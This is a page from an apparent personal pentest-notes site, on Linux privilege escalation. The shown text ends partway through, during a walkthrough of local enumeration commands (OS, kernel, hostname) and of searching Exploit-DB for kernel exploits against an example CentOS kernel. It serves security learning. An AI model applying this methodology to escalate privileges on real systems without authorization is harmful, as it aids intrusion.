<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8" />
        <meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="docsearch:name" content="Cyber Security" />
    <meta name="docsearch:package_type" content="" />
    <meta name="docsearch:release" content="" />
    <meta name="docsearch:version" content="" />
    
        <title>Privilege escalation - Linux &mdash; Cyber Security  documentation</title>
    
    <link rel="stylesheet" type="text/css" href="../../../../../_static/dist/fontawesome.css" />
      <link rel="stylesheet" type="text/css" href="../../../../../_static/dist/theme.css" />
      <link rel="stylesheet" type="text/css" href="../../../../../_static/graphviz.css" />
            <link rel="index" title="Index" href="../../../../../genindex.html" />
            <link rel="search" title="Search" href="../../../../../search.html" />
            <link rel="top" title="Cyber Security  documentation" href="#" />
            <link rel="up" title="Privilege Escalation" href="../PrivEsc.html" />
            <link rel="next" title="Post Exploitation" href="../../PostExploit/PostExploit.html" />
            <link rel="prev" title="Privilege Escalation" href="../PrivEsc.html" />
    </head>
<body>
    <header class="container-fluid bg-primary">
        <div class="container-fluid">
            <div class="navbar navbar-expand-lg navbar-dark font-weight-bold">
                    <a href="../../../../../index.html"
                        title="logoGrenouilleTech"
                        class="logo navbar-brand"
                    >
                        <img src="../../../../../_static/img/ColorLogoOpenHardware-noBackground.svg" width="500" height="400" alt="logoGrenouilleTech"
                            class="logo-img"
                        />
                        Cyber Security
                    </a>
                
                
                <button class="navbar-toggler btn btn-primary d-lg-none" type="button" data-toggle="collapse" data-target="#collapseSidebar" aria-expanded="false" aria-controls="collapseExample">
                    <span class="navbar-toggler-icon"></span>
                    <span class="sr-only">Menu</span>
                </button>
            </div>
        </div>
    </header>
    <div class="container-fluid">
        <div class="row">
            <aside class="col-12 col-lg-3 sidebar-container">
                <div id="collapseSidebar" class="collapse sticky-top d-lg-block pt-5 pr-lg-4">
<div id="searchbox" style="display: none" role="search">
  <h3 id="searchlabel">Quick search</h3>
    <div class="searchformwrapper">
    <form class="search" action="../../../../../search.html" method="get">
      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
      <input type="submit" value="Go" />
    </form>
    </div>
</div>
<script>document.getElementById('searchbox').style.display = "block"</script><div class="site-toc">
    <nav class="toc mt-3" aria-label="Main menu">
        <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="reference internal" href="../../../../CyberSec.html">Cyber Security</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../../../LearningProcess/LearningProcess.html">Learning Process</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../LearningProcess/Trainning/Trainning.html">Tranning and CTF</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../BlueTeam/BlueTeam.html">Blue Team</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../BlueTeam/DarkwebOps/DarkwebOps.html">Introduction to Darkweb Operations</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../BlueTeam/DarkwebOps/Introduction/Introduction.html">Introduction</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../BlueTeam/SIEM/SIEM.html">Security Information and Event Management - SIEM</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Distrib/Distrib.html">Cyber Security OS Distribution</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../Distrib/Kali/Kali.html">Kali</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Hardware/Hardware.html">Hardware [WIP]</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="../../../Pentest.html">The Pentest</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="../../../Scope/Scope.html">Objectives &amp; Scope</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Scope/blackGreyWhite/blackGreyWhite.html">Black, Grey &amp; White box penetration testing</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Scope/rules/rules.html">Rules of engagement &amp; Results</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Enumeration/Enumeration.html">Enumeration</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Enumeration/PassiveEnum/PassiveEnum.html">Passive information gathering</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Enumeration/ActiveEnum/ActiveEnum.html">Active information gathering</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../../Enumeration/ActiveEnum/NetEnum/NetEnum.html">Network Enumeration</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../../Enumeration/OSINT/OSINT.html">OSInt</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Vulnerability/Vulnerability.html">Vulnerability, identification and assesment</a></li>
<li class="toctree-l3 current"><a class="reference internal" href="../../Exploitation.html">Exploitation</a><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../../Exploit/Exploit.html">Exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../TransfertExploit/TransfertExploit.html">Transferring the exploit to the target host</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../ExploitVulnInPractice/ExploitVulnInPractice.html">Exploiting vulnerabilities in practice</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../BypassSec/BypassSec.html">Bypass Security</a></li>
<li class="toctree-l4 current"><a class="reference internal" href="../PrivEsc.html">Privilege Escalation</a><ul class="current">
<li class="toctree-l5 current"><a class="current reference internal" href="#">Privilege escalation - Linux</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../PostExploit/PostExploit.html">Post Exploitation</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Phishing/Phishing.html">Phishing</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../Phishing/Scenario/Scenario.html">Scenario</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Ressources/Ressources.html">Ressources</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../Ressources/Guides/Guides.html">Guides</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Ressources/Blog/Blog.html">Blogs</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/FlipperZero/FlipperZero.html">FlipperZero</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/LDAPBlog/LDAPBlog.html">LDAP - Blog and Cheat sheet</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/LinPirvEsc/LinPirvEsc.html">Linux Privilege Escalation - blog &amp; cookbook</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/OSintBlog/OSintBlog.html">OSInt - Blogs</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/WinPrivEsc/WinPrivEsc.html">Windows Privilege Escalation - blog &amp; cookbook</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/Blog/WriteUp/WriteUp.html">Write-Up</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Ressources/SearchEngine/SearchEngine.html">Search Engines</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Ressources/SearchEngine/OSIntSearchEngine/OSIntSearchEngine.html">OSInt - Search Engine</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../webSecurity/webSecurity.html">Web Security</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../webSecurity/bugBountyVDS/bugBountyVDS.html">Bug Bounty &amp; Vulnerability Disclosur Program (VDS)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/webSecurityAcademy.html">Web Security Academy</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/serverSideVulnerabilities.html">Server-Side Vulnerabilities</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/pathTraversal/pathTraversal.html">Path Traversal</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/accessControl/accessControl.html">Access Control</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/AuthenticationVuln/AuthenticationVuln.html">Authentication vulnerabilities</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/SSRF/SSRF.html">Server-Side Request Forgery</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/fileUploadVuln/fileUploadVuln.html">File Upload Vulnerabilities</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/OSCmdInjec/OSCmdInjec.html">OS command injection (AKA : shell injection)</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/SQLInjection/SQLInjection.html">SQL Injection (SQLi)</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/NoSQLi/NoSQLi.html">NoSQL injection</a><ul>
<li class="toctree-l6"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/NoSQLi/NoSQLi_syntax/NoSQLi_syntax.html">NoSQL - Syntax Injection</a></li>
<li class="toctree-l6"><a class="reference internal" href="../../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/NoSQLi/NoSQLi_operator/NoSQLi_operator.html">NoSQL - Operator Injection</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Technics/Technics.html">Technics</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../Technics/Fuzzing/Fuzzing.html">Fuzzing</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../Toolbox/Toolbox.html">Toolbox</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/BrowserExt/BrowserExt.html">Browser Extensions</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/BrowserExt/BuiltwithTechProf/BuiltwithTechProf.html">BuiltWith Technology Profiler</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/BrowserExt/OWASPPenTestKit/OWASPPenTestKit.html">OWASP Penetration Testing Kit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/BrowserExt/TruffleHog/TruffleHog.html">TruffleHog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/BrowserExt/Whatruns/Whatruns.html">WhatRuns</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/BrowserExt/YeswehackVDPFinder/YeswehackVDPFinder.html">Weblinks</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/BurpSuite/BurpSuite.html">BurpSuite</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Certutil/Certutil.html">Certutil.exe</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/CeWL/CeWL.html">CeWL - Custom Word List generator</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/CrossLinked/CrossLinked.html">CrossLinked</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/DockerInUrl/DockerInUrl.html">Docker-Inurlbr</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Exegol/Exegol.html">Exegol</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Ffuf/Ffuf.html">ffuf</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/GoAD/GoAD.html">Game of Active Directory (GoAD)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Gophish/Gophish.html">Gophish</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Hoaxshell/Hoaxshell.html">Hoaxshell</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/JohnTheRipper/JohnTheRipper.html">John the Ripper password cracker</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/LDAPMonitor/LDAPMonitor.html">LDAPMonitor</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/LinPEAS/LinPEAS.html">LinPEAS – Linux Privilege Escalation Awesome Script</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/MailHog/MailHog.html">MailHog</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Metasploit/Metasploit.html">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Metasploit/Meterpreter/Meterpreter.html">Meterpreter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Metasploit/Msfvenom/Msfvenom.html">Msfvenom</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Netcat/Netcat.html">Netcat</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Netcat/ncWebServer/ncWebServer.html">Netcat - Web Server</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/NetCmd/NetCmd.html">Net Command</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Nmap/Nmap.html">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Nmap/hostDiscovery/hostDiscovery.html">Host Discovery</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Nmap/nmapPortScan/nmapPortScan.html">Nmap Port Scanning Techniques</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Nmap/Fingerprint/Fingerprint.html">Fingerprinting services and operating systems</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Nmap/NmapScripEngine/NmapScripEngine.html">Namp Script Engine (NSE)</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Nmap/outputData/outputData.html">Output Data to files</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/OsintTools/OsintTools.html">OSInt Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Owasp_ZAP/Owasp_ZAP.html">ZAP (owasp)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Payload/Payload.html">Payload</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Powershell/Powershell.html">Powershell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Powershell/psFileTransfert/psFileTransfert.html">PowerShell - File Transfert</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Pwncat/Pwncat.html">Pwncat</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Python/Python.html">Python</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/Python/pyWebServer/pyWebServer.html">Python - Web server</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/PwnDocNg/PwnDocNg.html">PwnDoc-NG</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Responder/Responder.html">Responder</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/ReverseShell/ReverseShell.html">Reverse Shell</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/RTTool/RTTool.html">Red Team Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/SploitScan/SploitScan.html">SploitScan</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Searchsploit/Searchsploit.html">Searchsploit</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/SystemCmd/SystemCmd.html">System commands</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/SysReptor/SysReptor.html">SysReptor</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/UnixPrivescCheck/UnixPrivescCheck.html">Unix-Privesc-Check</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/VBSript/VBSript.html">VBSript</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/wget/wget.html">wget</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Wireshark/Wireshark.html">Wireshark</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../Toolbox/Wordlist/Wordlist.html">Wordlist / Dictionary</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../Toolbox/CeWL/CeWL.html">CeWL - Custom Word List generator</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../../../../HackTheBox/HackTheBox.html">Hack The Box</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../../HackTheBox/LearningProcess/LearningProcess.html">Learning Process</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../HackTheBox/Organization/Organization.html">Organization</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../HackTheBox/NetworkTrafficAnalysis/NetworkTrafficAnalysis.html">Network Traffic Analysis (NTA)</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../HackTheBox/WebRequests/WebRequests.html">Web Requests</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../HackTheBox/WebRequests/HTTP/HTTP.html">HyperText Transfer Protocol - HTTP</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../../../HackTheBox/WebRequests/HTTP/ReqResp/ReqResp.html">HTTP Requests and Responses</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../HackTheBox/WebRequests/HTTP/Headers/Headers.html">HTTP Headers</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../../../HackTheBox/WebRequests/HTTP/Methods/Methods.html">HTTP Methods and Codes</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../../HackTheBox/WebApplications/WebApplications.html">Web Applications - Technics</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../../HackTheBox/WebApplications/xss/xss.html">Cross-Site Scripting (XSS)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../../HackTheBox/WebApplications/CSRF/CSRF.html">Cross-Site Request Forgery (CSRF)</a></li>
</ul>
</li>
</ul>
</li>
</ul>

    </nav>
    <template data-toggle-item-template>
        <button class="btn btn-sm btn-link toctree-expand" type="button">
            <span class="sr-only">Toggle menu contents</span>
        </button>
    </template>
</div>
                    <div class="d-lg-none border-bottom">
                        
                    </div>
                </div>
            </aside>
            <div class="col-12 col-lg-9 pt-5">
                <header class="row align-items-baseline">
                    <div class="col">
                        <nav aria-label="breadcrumb">
    <ol class="breadcrumb m-0 p-0 bg-transparent">
        <li class="breadcrumb-item"><a href="../../../../../index.html">Docs</a></li>
            <li class="breadcrumb-item"><a href="../../../../CyberSec.html">Cyber Security</a></li>
            <li class="breadcrumb-item"><a href="../../../Pentest.html">The Pentest</a></li>
            <li class="breadcrumb-item"><a href="../../Exploitation.html">Exploitation</a></li>
            <li class="breadcrumb-item"><a href="../PrivEsc.html">Privilege Escalation</a></li>
        <li class="breadcrumb-item active" aria-current="page">Privilege escalation - Linux</li>
    </ol>
</nav>
                    </div>
                    <div class="col-sm-12 col-lg-auto mt-3 mt-lg-3">
                        <noscript>
                            <p>JavaScript is required to toggle light/dark mode..</p>
                        </noscript>
                        <button id="ahd-theme" class="btn btn-sm btn-light text-decoration-none" type="button">
                            <span class="dark-only"><i class="fas fa-sun"></i> Light mode</span>
                            <span class="light-only"><i class="fas fa-moon"></i> Dark mode</span>
                        </button>
    <a class="btn btn-sm btn-light text-decoration-none" href="https://github.com/ahdcreative/sphinx_ahd_theme/blob/main/docs/CyberSec/Pentest/Exploitation/PrivEsc/PriEscLinux/PriEscLinux.rst" rel="nofollow">
        <span class="btn-icon"><span class="fab fa-github"></span></span>
        <span class="btn-text">Edit on GitHub</span>
    </a>
    <a class="btn btn-sm btn-light text-decoration-none" href="../../../../../_sources/CyberSec/Pentest/Exploitation/PrivEsc/PriEscLinux/PriEscLinux.rst.txt" rel="nofollow">
        <span class="btn-icon"><span class="fas fa-code"></span></span>
        <span class="btn-text">View source</span>
    </a>
                        
                    </div>
                </header>
                <div class="row" >
                    <div class="col-12">
                        <hr class="w-100 my-4">
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 col-lg-9 order-last order-lg-first rst-content">
                        <main role="main">
<section id="privilege-escalation-linux">
<h1><a class="toc-backref" href="#contents" role="doc-backlink">Privilege escalation - Linux</a><a class="headerlink" href="#privilege-escalation-linux" title="Permalink to this heading">¶</a></h1>
<nav class="contents" id="contents">
<span id="index-0"></span><p class="topic-title">Contents</p>
<ul class="simple">
<li><p><a class="reference internal" href="#privilege-escalation-linux" id="id1">Privilege escalation - Linux</a></p>
<ul>
<li><p><a class="reference internal" href="#collecting-system-information-manually" id="id2">Collecting system information manually</a></p>
<ul>
<li><p><a class="reference internal" href="#linux-command-to-get-system-information" id="id3">Linux command to get system information</a></p>
<ul>
<li><p><a class="reference internal" href="#os-kernel-hostname" id="id4">OS, Kernel &amp; Hostname</a></p></li>
<li><p><a class="reference internal" href="#users" id="id5">Users</a></p></li>
<li><p><a class="reference internal" href="#suid" id="id6">SUID</a></p></li>
<li><p><a class="reference internal" href="#networking-information" id="id7">Networking information</a></p></li>
<li><p><a class="reference internal" href="#applications-and-services" id="id8">Applications and services</a></p></li>
<li><p><a class="reference internal" href="#files-and-file-systems" id="id9">Files and file systems</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#automated-scripts" id="id10">Automated Scripts</a></p></li>
<li><p><a class="reference internal" href="#limitations-of-automated-scripts" id="id11">Limitations of automated scripts</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#exploiting-the-linux-kernel" id="id12">Exploiting the Linux kernel</a></p>
<ul>
<li><p><a class="reference internal" href="#downloading-and-compiling-the-exploit" id="id13">Downloading and compiling the exploit</a></p></li>
<li><p><a class="reference internal" href="#executing-the-exploit" id="id14">Executing the exploit</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#remediation-mitigation" id="id15">Remediation &amp; Mitigation</a></p>
<ul>
<li><p><a class="reference internal" href="#prevent-transferring-the-exploit" id="id16">Prevent transferring the exploit</a></p></li>
<li><p><a class="reference internal" href="#remove-compilation-tools" id="id17">Remove compilation tools</a></p></li>
<li><p><a class="reference internal" href="#prevent-exploit-execution" id="id18">Prevent exploit execution</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#weblinks" id="id19">Weblinks</a></p></li>
</ul>
</li>
</ul>
</nav>
<hr class="docutils" />
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Ressources</strong></p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference internal" href="../../../../Ressources/Blog/LinPirvEsc/LinPirvEsc.html#ref-linpriesc"><span class="std std-ref">Blog - Linux Privilege Escallation</span></a></p></li>
</ul>
</div></blockquote>
</div>
</div></blockquote>
<p>A lot of devices running on Linux.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Examples of devices that are very likely to run a Linux operating system are :</p>
<blockquote>
<div><ul class="simple">
<li><p>Firewalls</p></li>
<li><p>Routers</p></li>
<li><p>VOIP servers</p></li>
<li><p>NAS</p></li>
<li><p>Web servers</p></li>
</ul>
</div></blockquote>
</div>
</div></blockquote>
<p>These kinds of devices are very critical for a company’s infrastructure with severe consequences
when they are compromised.</p>
<p>It happens very often that system administrators in Windows environments overlook the Linux devices
for many reasons. One of these reasons is the lack of knowledge about how to maintain Linux systems
and how to secure them. This can result in critical Linux devices being the weakest link in the
security chain and become a great security threat.</p>
<p>Therefore, it is very important as a penetration tester to focus not only on Windows systems because
they cover 90% of the company’s devices but also on (critical) Linux systems.</p>
<p>The most common ways of privilege escalation on Linux systems are leveraging kernel vulnerabilities,
misconfigurations and vulnerable software to execute arbitrary code under root privileges. New
kernel vulnerabilities occur on a regular basis and often involve a wide range of kernel versions.
A recently discovered example of a kernel vulnerability allowing for privilege escalation is the
<strong>DirtyCOW vulnerability</strong> affecting hundreds of Linux kernel versions. Also misconfigurations in
files, services and security mechanisms and out of date software commonly allow for privilege
escalation.</p>
<hr class="docutils" />
<section id="collecting-system-information-manually">
<h2><a class="toc-backref" href="#contents" role="doc-backlink">Collecting system information manually</a><a class="headerlink" href="#collecting-system-information-manually" title="Permalink to this heading">¶</a></h2>
<p>Nearly every step of a Pentest is related to the <strong>Enumeration</strong>. The privilege escalation doesn’t
make exception. Collecting relevant system information can be useful for privilege escalation such
as the kernel version, running services, installed applications and file permissions.</p>
<p>This will not only help us to gain a better understanding of how a system is configured but also to
know which applications and services are running on the host. Services running with root privileges
are of especial interest for privilege escalation. When we can exploit a service running as root to
execute arbitrary commands they will be executed as root. Applications that are configured to be
executed with higher privileges using a Linux feature named SUID are also very useful.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>For effective privilege escalation in Linux the system information you should know includes:</p>
<blockquote>
<div><ul class="simple">
<li><p>Distribution type</p></li>
<li><p>Kernel version</p></li>
<li><p>Running applications and services</p></li>
<li><p>Weak file permissions</p></li>
<li><p>Scheduled jobs</p></li>
<li><p>Other important information about the system.</p></li>
</ul>
</div></blockquote>
</div>
</div></blockquote>
<p>Collecting system information can be done both manually and automatically with scripts. The use of
automated scripts generally saves you a lot of time, but the information collected will be limited
to that which the script is programmed to retrieve. For example, if a script is not designed to
retrieve active connections then you may never find out about that one critical port running an
admin interface which is only accessible locally.</p>
<section id="linux-command-to-get-system-information">
<h3><a class="toc-backref" href="#contents" role="doc-backlink">Linux command to get system information</a><a class="headerlink" href="#linux-command-to-get-system-information" title="Permalink to this heading">¶</a></h3>
<section id="os-kernel-hostname">
<h4><a class="toc-backref" href="#contents" role="doc-backlink">OS, Kernel &amp; Hostname</a><a class="headerlink" href="#os-kernel-hostname" title="Permalink to this heading">¶</a></h4>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The following commands print the operating system, kernel version, hostname and system
information to the terminal.</p>
<div class="highlight-inputLanguage notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span> cat /etc/issue
<span class="linenos">2</span> cat /proc/version
<span class="linenos">3</span> hostname
<span class="linenos">4</span> uname -a
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/Linux-local-enumeration1.jpg"><img alt="../../../../../_images/Linux-local-enumeration1.jpg" class="align-center" src="../../../../../_images/Linux-local-enumeration1.jpg" style="width: 500px;" /></a>
<p>This information acquired can be used to check the Linux distribution and kernel for known
vulnerabilities, for instance, on Exploit-db or with searchsploit.</p>
</div>
</div></blockquote>
<p>It is also highly recommended to search the OS version in Google or Exploit-db for available
(kernel) exploits. This sometimes produces better search results.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The following example concerns a machine with kernel version <strong>3.10.0-123 on CentOS
7.0.1406</strong> which is vulnerable to <strong>CVE2014-3153</strong></p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>cat<span class="w"> </span>/etc/centos-release
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../../_images/PE-OS-Version-03-2.jpg"><img alt="../../../../../_images/PE-OS-Version-03-2.jpg" class="align-center" src="../../../../../_images/PE-OS-Version-03-2.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Searching for the specific kernel version does not immediately return useful search results for
privilege escalation exploits.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Searching on the OS version for privilege escalation exploits does provide some interesting
results.</p>
<a class="reference internal image-reference" href="../../../../../_images/PE-OS-Version-01.jpg"><img alt="../../../../../_images/PE-OS-Version-01.jpg" class="align-center" src="../../../../../_images/PE-OS-Version-01.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>Another good approach is to search Exploit-DB on the kernel version (or any identified software)
from narrow to wide with the “local” filter to ensure the exploits are local exploits only.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>For Linux Kernel 3.10.0-123</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>Linux<span class="w"> </span>kernel<span class="w"> </span><span class="m">3</span>.10.0-123<span class="w"> </span>//<span class="w"> </span>No<span class="w"> </span>results.
<span class="linenos">2</span><span class="w"> </span>Linux<span class="w"> </span>kernel<span class="w"> </span><span class="m">3</span>.10.0<span class="w">     </span>//<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nb">local</span><span class="w"> </span>exploit<span class="w"> </span>matching<span class="w"> </span>the<span class="w"> </span>kernel<span class="w"> </span>version.
<span class="linenos">3</span><span class="w"> </span>Linux<span class="w"> </span>kernel<span class="w"> </span><span class="m">3</span>.10<span class="w">       </span>//<span class="w"> </span>No<span class="w"> </span>results<span class="w"> </span>that<span class="w"> </span>match<span class="w"> </span>the<span class="w"> </span>CentOS<span class="w"> </span><span class="m">7</span><span class="w"> </span>operating<span class="w"> </span>system.
</pre></div>
</div>
<p>The following search looks for Linux kernels starting with “Linux Kernel 3.1”, which is
actually actually kernel version 3.1 and above.</p>
